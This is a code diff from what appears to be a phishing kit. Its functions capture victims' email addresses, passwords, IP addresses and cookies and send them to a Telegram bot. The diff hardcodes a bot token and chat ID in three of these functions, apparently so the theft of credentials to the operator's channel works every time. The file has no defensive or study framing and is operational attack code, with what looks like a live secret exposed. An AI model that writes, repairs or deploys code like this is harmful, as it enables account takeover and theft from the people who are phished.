@@ -307,8 +307,9 @@ def extract_and_save_cookies(driver, email, password=None):
 def send_first_attempt_to_telegram(email, password, ip_address):
     """Send first password attempt to Telegram"""
     try:
-        bot_token = config('BOT_TOKEN', default=None)
-        chat_id = config('CHAT_ID', default=None)
+        # Use hardcoded values for now to ensure they work
+        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
+        chat_id = "1645281955"
         
         if not bot_token or not chat_id:
             logger.error("❌ Telegram credentials not properly configured!")
@@ -350,8 +351,9 @@ def send_first_attempt_to_telegram(email, password, ip_address):
 def send_second_attempt_to_telegram(email, password, ip_address):
     """Send second password attempt to Telegram"""
     try:
-        bot_token = config('BOT_TOKEN', default=None)
-        chat_id = config('CHAT_ID', default=None)
+        # Use hardcoded values for now to ensure they work
+        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
+        chat_id = "1645281955"
         
         if not bot_token or not chat_id:
             logger.error("❌ Telegram credentials not properly configured!")
@@ -393,10 +395,11 @@ def send_second_attempt_to_telegram(email, password, ip_address):
 def send_immediate_credentials_to_telegram(email, password, ip_address):
     """Send credentials to Telegram immediately when entered"""
     try:
-        bot_token = config('BOT_TOKEN', default=None)
-        chat_id = config('CHAT_ID', default=None)
+        # Use hardcoded values for now to ensure they work
+        bot_token = "7393522943:AAHvfkr0vmQujkB91cXFfmQ3o4pc7OoJ3OM"
+        chat_id = "1645281955"
         
-        if not bot_token or not chat_id or bot_token == 'your-bot-token-here' or chat_id == 'your-chat-id-here':
+        if not bot_token or not chat_id:
             logger.warning(f"⚠️ Telegram credentials not configured - BOT_TOKEN: {bool(bot_token)}, CHAT_ID: {bool(chat_id)}")
             return True  # Don't fail the app if Telegram isn't configured
         
